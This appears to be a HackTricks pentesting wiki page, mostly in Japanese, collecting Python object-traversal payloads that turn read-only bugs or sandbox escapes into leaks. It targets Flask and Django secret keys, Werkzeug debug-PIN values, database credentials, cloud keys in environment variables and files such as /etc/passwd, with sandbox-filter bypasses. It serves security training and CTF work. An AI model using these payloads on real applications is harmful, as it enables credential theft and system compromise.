# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) や [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) などのさまざまな脆弱性により、**Python の内部データを読み取れるものの、コードを実行できない**場合があります。そのため、pentester はこれらの読み取り権限を最大限に活用して、**機密性の高い権限を取得し、脆弱性をエスカレート**する必要があります。

### Flask - secret key の読み取り

Flask アプリケーションのメインページには、おそらくこの **secret が設定されている** **`app`** グローバルオブジェクトがあります。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
この場合、[**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) にある **access global objects** 用の任意の gadget を使うだけで、この object にアクセスできます。

**vulnerability が別の Python file にある場合**、main file に到達して **global object `app.secret_key` にアクセス**するには、files を traverse する gadget が必要です。これにより、この key を知っている状態で [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) できます。

この [writeup](https://ctftime.org/writeup/36082) にある次のような payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
この payload を使用して **`app.secret_key` を読み取ります**。元の bug で write primitive（たとえば、class pollution）も得られる場合は、同じ path を使用してこれを置き換え、より privileged な Flask cookie に署名できます。

### Werkzeug - machine_id と node uuid

[**この writeup の payload を使用すると**](https://vozec.fr/writeups/tweedle-dum-dee/)、**machine_id** と **uuid** node にアクセスできます。これらは、[**Werkzeug pin を生成する**](../../network-services-pentesting/pentesting-web/werkzeug.md)ために必要な **private bits** であり、**debug mode が有効**な場合は `/console` の python console にアクセスできます。
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Webページで**エラー**を発生させると、**`app.py`へのサーバーのローカルパス**を取得でき、その**パスが表示される**場合があります。

脆弱性が別のPythonファイルに存在する場合は、メインのPythonファイルからオブジェクトにアクセスするために、前述のFlask trickを確認してください。

### Django - SECRET_KEY and settings module

Djangoのsettings objectは、アプリケーションの起動後に`sys.modules`へキャッシュされます。read primitivesだけで、**`SECRET_KEY`**、fallback keys、database credentials、またはsigning saltsをleakできます。
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
脆弱な gadget が別の module にある場合は、まず globals をたどります：
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` は現在の `SECRET_KEY` と同じくらい価値があります。ローテーション中も古い署名済みの値を検証できるためです。また、影響が cookie forgery のみに限定されるのか、それともさらに強力なものなのかを迅速に判断するため、`SESSION_ENGINE` と `SESSION_SERIALIZER` も leak させます。Web への影響の詳細については、[**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) を確認してください。

### Module loader gadgets - ソースコードとファイルの読み取り

ロード済みの Python モジュールには通常 `__loader__` が保持されています。ファイルベースの loader では `get_source()` と `get_data()` が公開されていることが多く、`open()` にはアクセスできなくてもモジュールオブジェクトにはすでに到達できる場合に、完全な **read-only primitives** として利用できます：
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
これは **config modules、blueprints、helper files、または hidden routes** を dump し、API keys、DSNs、flag paths、または追加の gadget entry points を回収するのに非常に有用です。

subclass enumeration しかない場合は、インデックスを hard-coding する代わりに、名前で loader を検索します：
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Generator/coroutine object を作成または到達できる場合、その frame は、関数の `__globals__` gadget を必要とせずに globals を leak できます。これは、dunder name だけを block し、`gi_frame`、`ag_frame`、`cr_frame`、`f_globals` などの frame attributes を見落とす filter に対して有用です。
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Once you have frame globals, 他の gadget（`sys.modules`、settings objects、`os.environ` など）とまったく同じ手順を続けます。最近の sandbox escapes では、`gi_frame` と `f_globals` が dunder attributes ではなく、単純な deny-list をすり抜けることが多いため、この手法が何度も再発見されています。

### ロード済みモジュール経由の環境変数 / cloud creds

多くの jail では、どこかで `os` または `sys` が import されています。到達可能な任意の関数の `__init__.__globals__` を悪用して、すでに import 済みの `os` モジュールへ pivot し、API tokens、cloud keys、flags を含む **環境変数** をダンプできます：
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
サブクラスインデックスがフィルタリングされている場合は、loadersを使用します：
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
環境変数は、read から完全な compromise へ移行するために必要な唯一の secrets であることが頻繁にあります（cloud IAM keys、database URLs、signing keys など）。

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)、`<0.62.0`) では、細工した component requests による **class pollution** が可能でした。`__init__.__globals__` のような property path を設定すると、攻撃者は component module の globals と、そこから import されたモジュール（`settings`、`os`、`sys` など）に到達できました。これにより、code execution なしで `SECRET_KEY`、`DATABASES`、または service credentials を leak できます。この exploit chain は完全に read-based で、上記と同じ dunder-gadget patterns を使用します。

### Chaining 用の Gadget collections

Recent CTFs と pyjail research では、attribute access と subclass enumeration のみで構築された、信頼性の高い read chains が示されています。[**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) のような community-maintained lists には、objects から `__globals__`、`sys.modules`、そして最終的に sensitive data へ traverse するために組み合わせられる、数百の minimal gadgets が catalog されています。raw subclass indexes よりも **attribute/name based searches** を優先してください。`os._wrap_close`、`FileLoader`、`warnings.catch_warnings` などの位置は、Python versions 間や追加の imported libraries によって変化するためです。

## References

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
